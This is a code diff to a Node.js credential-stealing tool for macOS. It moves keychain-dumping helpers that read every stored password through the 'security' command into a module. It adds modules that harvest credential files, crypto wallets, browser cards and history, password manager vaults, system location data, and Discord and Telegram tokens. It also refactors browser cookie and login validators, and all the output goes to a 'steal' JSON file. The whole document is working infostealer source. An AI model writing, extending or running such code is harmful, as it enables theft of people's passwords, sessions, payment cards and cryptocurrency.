@@ -23,8 +23,13 @@ const crypto = require('crypto');
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
-const { execFileSync } = require('child_process');
 const { readSchema, scanRecords } = require('./lib/sqlite');
+const { keychainGet, keychainItems, dumpKeychain } = require('./lib/keychain');
+const { stealCreds } = require('./lib/creds');
+const { stealBrowserDeep } = require('./lib/browserdeep');
+const { stealSystem } = require('./lib/system');
+const { stealPassMgr } = require('./lib/passmgr');
+const { stealMessengers } = require('./lib/messengers');
 
 // ---------------------------------------------------------------------------
 // CLI args
@@ -37,63 +42,6 @@ function argVal(flag, dflt) {
 const QUIET = args.includes('--quiet');
 const OUT = argVal('--out', path.join(process.cwd(), 'steal-' + Date.now() + '.json'));
 const log = (...a) => { if (!QUIET) console.log(...a); };
-
-// ---------------------------------------------------------------------------
-// Keychain helpers (via the `security` CLI)
-// ---------------------------------------------------------------------------
-function keychainGet(service, account) {
-  try {
-    const cmd = ['find-generic-password', '-w', '-s', service];
-    if (account) cmd.push('-a', account);
-    return execFileSync('security', cmd, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
-  } catch (e) {
-    return null;
-  }
-}
-
-// Parse `security dump-keychain` into a list of {service, account} generic
-// password items. Values are fetched separately (the dump does not print them).
-function keychainItems() {
-  let out;
-  try {
-    out = execFileSync('security', ['dump-keychain'], {
-      encoding: 'utf8',
-      maxBuffer: 1024 * 1024 * 512,
-      stdio: ['ignore', 'pipe', 'pipe'],
-    });
-  } catch (e) {
-    return [];
-  }
-  const items = [];
-  const seen = new Set();
-  for (const block of out.split('class: "genp"').slice(1)) {
-    const sv = block.match(/"svce"<blob>="((?:[^"\\]|\\.)*)"/);
-    const ac = block.match(/"acct"<blob>="((?:[^"\\]|\\.)*)"/);
-    const service = sv ? sv[1] : null;
-    const account = ac ? ac[1] : null;
-    const key = service + '\u0000' + (account || '');
-    if (seen.has(key)) continue;
-    seen.add(key);
-    items.push({ service, account });
-  }
-  return items;
-}
-
-function dumpKeychain() {
-  const out = { total: 0, entries: [] };
-  for (const item of keychainItems()) {
-    if (!item.service) continue;
-    const value = keychainGet(item.service, item.account);
-    out.total++;
-    out.entries.push({
-      service: item.service,
-      account: item.account,
-      value: value === null ? undefined : value,
-      retrieved: value !== null,
-    });
-  }
-  return out;
-}
 
 // ---------------------------------------------------------------------------
 // Chromium cookie / password decryption
@@ -227,13 +175,17 @@ function dedupePasswords(list) {
 //   logins:  0=origin_url ... 3=username_value 5=password_value
 const TABLE_VALIDATORS = {
   // host_key (col 1) must look like a domain: has a dot, no spaces, < 253 chars.
-  cookies: (vals) =>
-    typeof vals[1] === 'string' && vals[1].includes('.') && !/\s/.test(vals[1]) && vals[1].length < 253,
+  cookies: (getCol) => {
+    const h = getCol(1);
+    return typeof h === 'string' && h.includes('.') && !/\s/.test(h) && h.length < 253;
+  },
   // origin_url (col 0) must be a real login origin: an http(s) URL or an
   // android:// app-sync entry. (Rejects the scanner's truncated fragments like
   // "ps://accounts.google" that start mid-URL.)
-  logins: (vals) =>
-    typeof vals[0] === 'string' && /^(https?|android|file):\/\//i.test(vals[0]),
+  logins: (getCol) => {
+    const u = getCol(0);
+    return typeof u === 'string' && /^(https?|android|file):\/\//i.test(u);
+  },
 };
 
 // `validators` maps table name -> row validator; defaults to the Chromium
@@ -450,8 +402,10 @@ function discoverFirefoxProfiles() {
 
 // host is moz_cookies column 4.
 const FIREFOX_VALIDATORS = {
-  moz_cookies: (vals) =>
-    typeof vals[4] === 'string' && vals[4].includes('.') && !/\s/.test(vals[4]),
+  moz_cookies: (getCol) => {
+    const h = getCol(4);
+    return typeof h === 'string' && h.includes('.') && !/\s/.test(h);
+  },
 };
 
 function firefoxDecryptor() {
@@ -653,6 +607,11 @@ function main() {
     safari: null,
     other_apps: [],
     keychain: null,
+    creds: null,
+    browser_deep: null,
+    system: null,
+    password_managers: null,
+    messengers: null,
   };
   for (const browser of BROWSERS) {
     const r = stealBrowser(browser);
@@ -668,6 +627,27 @@ function main() {
   log('Dumping keychain...');
   report.keychain = dumpKeychain();
   log(`Keychain: ${report.keychain.entries.filter((e) => e.retrieved).length}/${report.keychain.total} values retrieved`);
+
+  log('Scanning credential stores + wallets...');
+  report.creds = stealCreds();
+  log(`creds: ${Object.keys(report.creds.files).length} files, ${report.creds.wallets.length} wallet dirs`);
+
+  log('Browser deep-dive (history / cards / bookmarks / downloads / tabs / extensions)...');
+  report.browser_deep = stealBrowserDeep();
+  log(`browser_deep: ${report.browser_deep.profiles.length} profiles`);
+
+  log('System identity & location...');
+  report.system = stealSystem();
+
+  log('Password managers...');
+  report.password_managers = stealPassMgr();
+  log(`password_managers: ${report.password_managers.vaults.length} vaults`);
+
+  log('Messengers (Discord + Telegram)...');
+  report.messengers = stealMessengers(makeDecryptor);
+  const dc = report.messengers.discord;
+  log(`messengers: discord tokens=${dc.tokens.length} (raw values=${dc.token_values.length}), telegram found=${report.messengers.telegram.found}`);
+
   fs.writeFileSync(OUT, JSON.stringify(report, null, 2));
   log('Wrote ' + OUT);
   return report;
